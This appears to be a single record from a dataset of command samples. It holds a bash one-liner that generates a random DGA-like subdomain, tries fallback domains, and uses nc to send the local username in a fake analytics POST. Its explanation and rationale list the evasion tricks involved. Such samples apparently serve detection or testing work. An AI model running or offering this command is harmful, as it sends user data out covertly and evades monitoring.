command:
bash -c "base=cdn-example.net; rand=$(head -c16 /dev/urandom | tr -dc a-z0-9 | head -c8); d="$rand.$base"; host=''; ip=''; for h in "$d" "$base" static.$base; do ip=$(getent hosts "$h" | awk '{print $1}' | shuf -n1); if [ -n "$ip" ]; then host="$h"; break; fi; done; ua="Mozilla/5.0 (X11; Linux x86_64)"; body="evt=pageview&u=$USER"; printf 'POST /collect HTTP/1.1
Host: %s
User-Agent: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %d
Connection: close

%s' "$host" "$ua" ${#body} "$body" | nc -w 5 "$ip" 80"
explanation: Uses a random subdomain (runtime DGA-like behavior) with fallback domains and resolves via system NSS (getent); posts telemetry-looking data to a generic collection path.
rationale_steps: Generate random subdomain to force dynamic DNS lookup each run.
Resolve with getent to use system resolver and caches.
Fallback to base and static domains for persistence.
Imitate analytics POST over HTTP via nc.
